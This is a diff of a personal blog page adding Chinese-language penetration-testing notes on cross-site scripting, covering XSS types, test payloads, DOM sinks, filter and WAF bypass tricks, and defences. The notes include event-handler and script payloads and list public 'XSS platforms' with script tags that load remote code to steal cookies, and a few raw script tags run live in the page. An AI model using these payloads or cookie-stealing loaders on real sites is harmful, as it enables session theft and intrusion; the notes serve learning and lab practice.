@@ -20,18 +20,20 @@
     var CONFIG = {"hostname":"dtxharry.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="随便写点自己的笔记">
+  <meta name="description" content="简单介绍XSS,XSS种类以及如何绕过过滤">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Xss-跨站脚本攻击">
 <meta property="og:url" content="https://dtxharry.github.io/2023/08/21/Xss-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/index.html">
 <meta property="og:site_name" content="Dtx&#39;s Realm">
-<meta property="og:description" content="随便写点自己的笔记">
+<meta property="og:description" content="简单介绍XSS,XSS种类以及如何绕过过滤">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:\Users\dtxha\AppData\Roaming\Typora\typora-user-images\image-20230506173435301.png">
 <meta property="article:published_time" content="2023-08-21T08:35:01.000Z">
-<meta property="article:modified_time" content="2023-08-21T08:35:01.957Z">
+<meta property="article:modified_time" content="2023-08-21T14:40:28.689Z">
 <meta property="article:author" content="dtxHarry">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="XSS">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\dtxha\AppData\Roaming\Typora\typora-user-images\image-20230506173435301.png">
 
 <link rel="canonical" href="https://dtxharry.github.io/2023/08/21/Xss-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">
 
@@ -222,11 +224,22 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2023-08-21 16:35:01" itemprop="dateCreated datePublished" datetime="2023-08-21T16:35:01+08:00">2023-08-21</time>
+              <time title="创建时间：2023-08-21 16:35:01 / 修改时间：22:40:28" itemprop="dateCreated datePublished" datetime="2023-08-21T16:35:01+08:00">2023-08-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
+                </span>
             </span>
 
           
+            <div class="post-description">简单介绍XSS,XSS种类以及如何绕过过滤</div>
 
         </div>
       </header>
@@ -237,7 +250,59 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <h1 id="1-Xss简介"><a href="#1-Xss简介" class="headerlink" title="1.Xss简介"></a>1.Xss简介</h1><h2 id="1-什么是xss"><a href="#1-什么是xss" class="headerlink" title="(1)什么是xss"></a>(1)什么是xss</h2><p>是一种前端代码的注入手法 =&gt; 用户输入的数据被当做<strong>前端代码</strong>执行</p>
+<p>前端代码:<strong>HTML</strong>[骨架]\<strong>CSS</strong>[美化]\<strong>JavaScript</strong>[可以实现一些功能(让网站可以不依赖后端),js可以控制浏览器]</p>
+<h2 id="2-什么是cookie"><a href="#2-什么是cookie" class="headerlink" title="(2)什么是cookie"></a>(2)什么是cookie</h2><p>Xss最经典的操作就是偷cookie(存在于浏览器),其中cookie的由来如下:↓</p>
+<p>​     HTTP/HTTPS 为了性能： 无状态、无连接协议  [无法区分用户]<br>​              =&gt; Cookie : 用一串随机字符来代替身份权限,存在于浏览器【不安全】</p>
+<pre><code> **cookie的实效性**   =&gt; 看网站的设置，给很久，那就可以很久、很短
+                         =&gt; 大部分网站的Cookie的都是一次会话
+                         =&gt; 浏览器完整关闭就属于一次会话
+</code></pre><p>​    <strong>cookie的同源性法则</strong>:同源的情况下coolie是共用的<br>​        <strong>同源的定义</strong>:必须同时满足   1.同ip/域名(域名要和域名相同,ip要和ip相同,大型网站比如百度ping出的ip不一定和www.baidu.com同源)<br>​                                                    2.同协议<br>​                                                    3.同端口<br>​        基本上同根目录的网站属于同源:<br>​                     <a target="_blank" rel="noopener" href="http://www.baidu.com">http://www.baidu.com</a><br>​                     <a target="_blank" rel="noopener" href="http://www.baidu.com/abc">http://www.baidu.com/abc</a></p>
+<h2 id="3-Xss的种类"><a href="#3-Xss的种类" class="headerlink" title="(3)Xss的种类"></a>(3)Xss的种类</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p> (你提交的数据成功的实现了XSS，但是仅仅是对你这次访问产生了影响，是非持久型攻击,单一访问有效)<br>比如靶场:      <strong>// ==&gt;注释</strong></p>
+<pre><code>    &#39; oninput=alert(1) //
+</code></pre><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>嵌入到web页面的恶意HTML会被存储到应用服务器端，简而言之就是会被存储到数据库，等用户在打开页面时，会继续执行恶意代码，能够持续的攻击用户(你提交的数据成功的实现了XSS，存入了数据库，别人访问这个页面的时候就会自动触发,比如留言板)    </p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM—based XSS漏洞是基于文档对象模型Document Object Model，DOM的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。</p>
+<h1 id="2-三种触发js的情况"><a href="#2-三种触发js的情况" class="headerlink" title="2.三种触发js的情况"></a>2.三种触发js的情况</h1><h2 id="标签风格："><a href="#标签风格：" class="headerlink" title="标签风格："></a>标签风格：</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(666)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="伪协议："><a href="#伪协议：" class="headerlink" title="伪协议："></a>伪协议：</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>abcd<span class="tag">&lt;/<span class="name">a</span>&gt;</span> //只要有人调用了JavaScript:alert(1)就会弹窗</span><br><span class="line">[伪协议即小众协议,比如  weixin://     weishi://      dy://    ]</span><br><span class="line">javascript:alert(1) （经典代码<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span>）  Javascript实际上是一个伪协议</span><br><span class="line">    伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://，</span><br><span class="line">	伪协议只有关联应用能够用，比如 php://   tencent://(关联QQ) </span><br><span class="line">	      javascript:伪协议实际上声明了URL的主体是任意的javascript代码</span><br></pre></td></tr></table></figure>
+<h2 id="事件型："><a href="#事件型：" class="headerlink" title="事件型："></a>事件型：</h2><p>事件(因为发生了某件事情，所以自动触发某个机制)<br>    关键词：在标签里面出现 onxxxx=要执行JS代码</p>
+<p>​                onerror=  [加载失败的时候]<br>​                onload= [加载成功的时候]<br>​                onclick= [点击的时候]<br>​                oninput= [输入框输入数据的时候]<br>​                onfocus= [当获取光标的时候]<br>​                <strong>跟大部分标签可以任意组合</strong>    </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;text&#x27;</span> /&gt;</span></span><br><span class="line">				↓</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;text&#x27;</span> <span class="attr">oninput</span>=<span class="string">alert(11)</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;123&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="3-测试XSS的步骤"><a href="#3-测试XSS的步骤" class="headerlink" title="3.测试XSS的步骤"></a>3.测试XSS的步骤</h1><h2 id="1-见框就插"><a href="#1-见框就插" class="headerlink" title="(1)见框就插"></a>(1)见框就插</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot; oninput=alert(1) //    #进行闭合</span><br><span class="line">&lt; script&gt;alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&quot; onfocus=alert(1) autofocus //</span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="2-查看源码"><a href="#2-查看源码" class="headerlink" title="(2)查看源码"></a>(2)查看源码</h2><p>右键查看网页源代码,ctrl+F找到刚刚输入的内容,看看一共有几个输出点,从代码角度明白为什么没有弹窗,比如:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(12)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span></span><br></pre></td></tr></table></figure>
+<p>上面是源码中的内容,可见&lt;&gt;被过滤了,代码结构被破坏了. 这是一种防御xss的手法,叫做<strong>[HTML实体化]</strong>,这表明这个输出点没有xss漏洞</p>
+<h2 id="3-找其他输出点"><a href="#3-找其他输出点" class="headerlink" title="(3)找其他输出点"></a>(3)找其他输出点</h2><p>如果其他输出点也是和(2)一样被过滤,那说明没有xss,但是会有其他的情况,则可以尝试闭合事件形,伪协议等方法进行xss</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">源码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span> <span class="attr">value</span>=<span class="string">&#x27;sdfasdf&#x27;</span> &gt;</span></span><br><span class="line"></span><br><span class="line">尝试输入:  &#x27; oninput=alert(1)//</span><br></pre></td></tr></table></figure>
+<h1 id="4-存储型xss窃取cookie"><a href="#4-存储型xss窃取cookie" class="headerlink" title="4.存储型xss窃取cookie"></a>4.存储型xss窃取cookie</h1><p>要达到这个功能,需要比较强的JS编写能力且必须要有公网服务器来接受偷到Cookie</p>
+<p>以上暂时很难实现,所以我们可以用到<strong>XSS平台</strong>,它是已经搭建好的XSS攻击平台，只要注册就可以使用，针对非机密项目可以用.</p>
+<h2 id="1-暂时存活的XSS平台"><a href="#1-暂时存活的XSS平台" class="headerlink" title="(1)暂时存活的XSS平台:"></a>(1)暂时存活的XSS平台:</h2><p>​            keepsession （封神台一段时间不操作Cookie会掉，每分钟固定访问让Cookie不会失效）<br>​            <Img sRC=https://xss.pt/8FTvp.jpg>   偷IP + 访问地址[偷不到Cookie]<br>​            <sCRiPt sRC=//xss.pt/8FTv>&lt;/sCrIpT&gt;  把//xss.pt/8FTv地址的东西当作JS代码执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xss.pt      //常规XSS平台 </span><br><span class="line">xss.funwan.cn</span><br><span class="line">xss.iproute.cn</span><br><span class="line">xss.ceacer.cn</span><br><span class="line">usxss.xyz</span><br><span class="line">xssaq.com   //暴力平台</span><br><span class="line">xsscom.com  //xss靶场的时候不封ip的</span><br></pre></td></tr></table></figure>
+<h2 id="2-遇到CMS框架的网站可以查一下曾经的通杀漏洞"><a href="#2-遇到CMS框架的网站可以查一下曾经的通杀漏洞" class="headerlink" title="(2)遇到CMS框架的网站可以查一下曾经的通杀漏洞"></a>(2)遇到CMS框架的网站可以查一下曾经的通杀漏洞</h2><p>finecms (v5.3.0)存在存储型xss漏洞</p>
+<p>&lt;img src=”./upload/“ onerror=alert(1) //.jpg” width=”250px”&gt;</p>
+<p>​    文件名可以为” onerror=alert(1) //.jpg</p>
+<h1 id="5-DOM型xss"><a href="#5-DOM型xss" class="headerlink" title="5.DOM型xss"></a><strong>5.DOM型xss</strong></h1><h2 id="什么是DOM"><a href="#什么是DOM" class="headerlink" title="什么是DOM?"></a>什么是DOM?</h2><p>什么是DOM？<br>    DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式, 它就是一个树状的模型，你可以编写Javascript代码根据dom一层一层的节点，去遍历/获取/修改对应的节点,对象值。</p>
+<p>​    每个载入浏览器的 HTML 文档都会成为 Document 对象。<br>​    Document 对象使我们可以从脚本中对 HTML 页面中的所有元素进行访问</p>
+<p><strong>浏览器中有Window,document,location三个对象(widow对象下有location,document和history对象)</strong></p>
+<h2 id="什么是DOM型XSS？"><a href="#什么是DOM型XSS？" class="headerlink" title="什么是DOM型XSS？"></a>什么是DOM型XSS？</h2><p>DOM型XSS其实是一种特殊类型的XSS，它是基于DOM文档对象模型的一种漏洞。<br>    DOM—based XSS漏洞是基于文档对象模型Document Object Model，DOM的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。</p>
+<p><strong>document.referer属性、window.name属性、location属性innerHTML属性</strong><br><strong>documen.write属性，都可以触发DOM XSS的属性</strong></p>
+<h2 id="DOM型xss常见的js函数和使用情况"><a href="#DOM型xss常见的js函数和使用情况" class="headerlink" title="DOM型xss常见的js函数和使用情况"></a>DOM型xss常见的js函数和使用情况</h2><h3 id="document-cookie"><a href="#document-cookie" class="headerlink" title="document.cookie"></a>document.cookie</h3><p>读取当前网页的Cookie ,如果要传cookie,就后面加上<code>=&#39;123123123&#39;</code></p>
+<h3 id="location-hash"><a href="#location-hash" class="headerlink" title="location.hash"></a>location.hash</h3><p>返回锚点后的值（#）</p>
+<h1 id="锚点-相当于一个定位或者书签-不会刷新页面-所以基本不会被waf检测出来"><a href="#锚点-相当于一个定位或者书签-不会刷新页面-所以基本不会被waf检测出来" class="headerlink" title="锚点 :相当于一个定位或者书签,不会刷新页面,所以基本不会被waf检测出来"></a>锚点 :相当于一个定位或者书签,不会刷新页面,所以基本不会被waf检测出来</h1><h3 id="document-lastModified"><a href="#document-lastModified" class="headerlink" title="document.lastModified"></a>document.lastModified</h3><p>可以判断动态静态页面;<br>Html 静态文件<br>php jsp asp aspx 动态文件</p>
+<p>document.lastModified可以查看当前网页最后修改时间。如果查到的时间随时间不断变化，为动态页面。<br>    如果查询出来的时间是固定不变的，则为静态页面。<br>    具体问题具体分析，这只是大体判断网页是否为静态页面，仅供参考。<br>    这个页面（<a target="_blank" rel="noopener" href="http://59.63.200.79:8014/dom_xss/index.php）就是动态页面。">http://59.63.200.79:8014/dom_xss/index.php）就是动态页面。</a><br>    这个页面（<a target="_blank" rel="noopener" href="https://www.pku.edu.cn/campuslife/zygy/index.htm）就是静态的。静态页面通常将参数">https://www.pku.edu.cn/campuslife/zygy/index.htm）就是静态的。静态页面通常将参数</a>   <code>域名?id=</code> 转变为 <code>域名/id.html</code></p>
+<h3 id="document-write"><a href="#document-write" class="headerlink" title="document.write()"></a>document.write()</h3><p>这方法可向文档写入 HTML 表达式或 JavaScript 代码。</p>
+<p>​    <code>http://59.63.200.79:8014/dom_xss/index.php/1.txt?id=1&lt;h1&gt;123&lt;/h1&gt;</code></p>
+<script>document.write("/dom_xss/index.php/1.txt?id=1<h1>123</h1>");</script>
+
+<p>document.write会把里边的内容写到网页中去。<br>比如<h1>标签的内容会变成标题。</p>
+<script>alert(123)</script>
+
+<h3 id="document-getElementById-innerHTML-’’"><a href="#document-getElementById-innerHTML-’’" class="headerlink" title="document.getElementById().innerHTML=’’"></a>document.getElementById().innerHTML=’’</h3><p>innerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML,比如<code>&lt;div id=&#39;abcd&#39;&gt;NF&lt;/div&gt;</code>可以通过getElementById=’abcd’找到这个div标签,而NF就是这个标签中的innerHTML.</p>
+<h2 id="如何绕过xss过滤"><a href="#如何绕过xss过滤" class="headerlink" title="如何绕过xss过滤"></a>如何绕过xss过滤</h2><p>针对事件型漏洞，一般网站可能会对双引号进行实体化编码，这个时候如果没有dom型，或者单引号不能使用的情况下，还是真的不好绕过</p>
+<p>针对于黑名单过滤，总是过滤不全的，比如过滤了img，还有input，还有div等等<br>过滤了onclik、onmouseover，可以尝试比较冷梦的事件触发onmouseenter<br>过滤了小括号，可以尝试单引号，过滤了单引号可以尝试反引号<br>过滤了alert，可以尝试confirm和prompt<br>还有就是大小写、双写绕过之类的</p>
+<h3 id="Native编码是document-write-可识别的编码-可以用来绕过waf"><a href="#Native编码是document-write-可识别的编码-可以用来绕过waf" class="headerlink" title="Native编码是document.write()可识别的编码,可以用来绕过waf"></a>Native编码是document.write()可识别的编码,可以用来绕过waf</h3><h3 id="index-php-1-txt也可绕waf"><a href="#index-php-1-txt也可绕waf" class="headerlink" title="index.php/1.txt也可绕waf"></a>index.php/1.txt也可绕waf</h3><p>因为web容器认为txt是安全的,传参没有问题,但是找不到1.txt就往前找到php了</p>
+<h3 id="注释法也可以绕"><a href="#注释法也可以绕" class="headerlink" title="注释法也可以绕"></a>注释法也可以绕</h3><p><code>?id=/*&lt;script&gt;alert(1)&lt;/script&gt;*/</code>   /<em>*/之间的为注释,我的理解为因为是注释,所以狗让过了,但是在浏览器端,发现了右闭合标签可以和左边script标签闭合,所以进行了闭合,但是此时没有进行弹窗,要进行弹窗,得再给一个右闭合标签,才能让弹窗标签逃逸出来`<a target="_blank" rel="noopener" href="http://59.63.166.75:8154/?a=/">http://59.63.166.75:8154/?a=/</a></em>&lt;/script&gt;<script>alert(1)</script>*/`<img src="C:\Users\dtxha\AppData\Roaming\Typora\typora-user-images\image-20230506173435301.png" alt="image-20230506173435301"></p>
+<h1 id=""><a href="#" class="headerlink" title=" "></a> </h1><h1 id="XSS防御方法："><a href="#XSS防御方法：" class="headerlink" title="XSS防御方法："></a>XSS防御方法：</h1><p>​    1、过滤<br>​    2、编码（HTML实体编码 替代可能产生危险的字符&lt;&gt;&amp;”）<br>​        标签风格XSS  [事件型|伪协议]<br>​    3、http-only (Cookie的一种属于，如果这个Cookie有http-only,那么JS是无法读取)<br>​        设置其实是在获取Cookie的设置（开发）<br>​        能绕过：<br>​            1、IE浏览器<br>​            2、想办法让页面输出Cookie(探针，phpinfo())</p>
+
     </div>
 
     
@@ -262,6 +327,9 @@
 
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/XSS/" rel="tag"># XSS</a>
+          </div>
 
         
 
@@ -335,6 +403,16 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-Xss%E7%AE%80%E4%BB%8B"><span class="nav-text">1.Xss简介</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFxss"><span class="nav-text">(1)什么是xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E4%BB%80%E4%B9%88%E6%98%AFcookie"><span class="nav-text">(2)什么是cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Xss%E7%9A%84%E7%A7%8D%E7%B1%BB"><span class="nav-text">(3)Xss的种类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="nav-text">反射型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="nav-text">存储型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM%E5%9E%8BXSS"><span class="nav-text">DOM型XSS</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E4%B8%89%E7%A7%8D%E8%A7%A6%E5%8F%91js%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-text">2.三种触发js的情况</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%87%E7%AD%BE%E9%A3%8E%E6%A0%BC%EF%BC%9A"><span class="nav-text">标签风格：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="nav-text">伪协议：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8B%E4%BB%B6%E5%9E%8B%EF%BC%9A"><span class="nav-text">事件型：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E6%B5%8B%E8%AF%95XSS%E7%9A%84%E6%AD%A5%E9%AA%A4"><span class="nav-text">3.测试XSS的步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%A7%81%E6%A1%86%E5%B0%B1%E6%8F%92"><span class="nav-text">(1)见框就插</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81"><span class="nav-text">(2)查看源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%89%BE%E5%85%B6%E4%BB%96%E8%BE%93%E5%87%BA%E7%82%B9"><span class="nav-text">(3)找其他输出点</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E7%AA%83%E5%8F%96cookie"><span class="nav-text">4.存储型xss窃取cookie</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%9A%82%E6%97%B6%E5%AD%98%E6%B4%BB%E7%9A%84XSS%E5%B9%B3%E5%8F%B0"><span class="nav-text">(1)暂时存活的XSS平台:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-text">标签的内容会变成标题。
+alert(123)
+
+document.getElementById().innerHTML&#x3D;’’innerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML,比如&lt;div id&#x3D;&#39;abcd&#39;&gt;NF&lt;&#x2F;div&gt;可以通过getElementById&#x3D;’abcd’找到这个div标签,而NF就是这个标签中的innerHTML.
+如何绕过xss过滤针对事件型漏洞，一般网站可能会对双引号进行实体化编码，这个时候如果没有dom型，或者单引号不能使用的情况下，还是真的不好绕过
+针对于黑名单过滤，总是过滤不全的，比如过滤了img，还有input，还有div等等过滤了onclik、onmouseover，可以尝试比较冷梦的事件触发onmouseenter过滤了小括号，可以尝试单引号，过滤了单引号可以尝试反引号过滤了alert，可以尝试confirm和prompt还有就是大小写、双写绕过之类的
+Native编码是document.write()可识别的编码,可以用来绕过wafindex.php&#x2F;1.txt也可绕waf因为web容器认为txt是安全的,传参没有问题,但是找不到1.txt就往前找到php了
+注释法也可以绕?id&#x3D;&#x2F;*&lt;script&gt;alert(1)&lt;&#x2F;script&gt;*&#x2F;   &#x2F;*&#x2F;之间的为注释,我的理解为因为是注释,所以狗让过了,但是在浏览器端,发现了右闭合标签可以和左边script标签闭合,所以进行了闭合,但是此时没有进行弹窗,要进行弹窗,得再给一个右闭合标签,才能让弹窗标签逃逸出来&#96;http:&#x2F;&#x2F;59.63.166.75:8154&#x2F;?a&#x3D;&#x2F;&lt;&#x2F;script&gt;alert(1)*&#x2F;&#96;
+ XSS防御方法：​    1、过滤​    2、编码（HTML实体编码 替代可能产生危险的字符&lt;&gt;&amp;”）​        标签风格XSS  [事件型|伪协议]​    3、http-only (Cookie的一种属于，如果这个Cookie有http-only,那么JS是无法读取)​        设置其实是在获取Cookie的设置（开发）​        能绕过：​            1、IE浏览器​            2、想办法让页面输出Cookie(探针，phpinfo())
+</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#document-getElementById-innerHTML-%E2%80%99%E2%80%99"><span class="nav-text">document.getElementById().innerHTML&#x3D;’’</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87xss%E8%BF%87%E6%BB%A4"><span class="nav-text">如何绕过xss过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Native%E7%BC%96%E7%A0%81%E6%98%AFdocument-write-%E5%8F%AF%E8%AF%86%E5%88%AB%E7%9A%84%E7%BC%96%E7%A0%81-%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E7%BB%95%E8%BF%87waf"><span class="nav-text">Native编码是document.write()可识别的编码,可以用来绕过waf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#index-php-1-txt%E4%B9%9F%E5%8F%AF%E7%BB%95waf"><span class="nav-text">index.php&#x2F;1.txt也可绕waf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A%E6%B3%95%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%BB%95"><span class="nav-text">注释法也可以绕</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-text"> </span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="nav-text">XSS防御方法：</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -357,13 +435,13 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">21</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
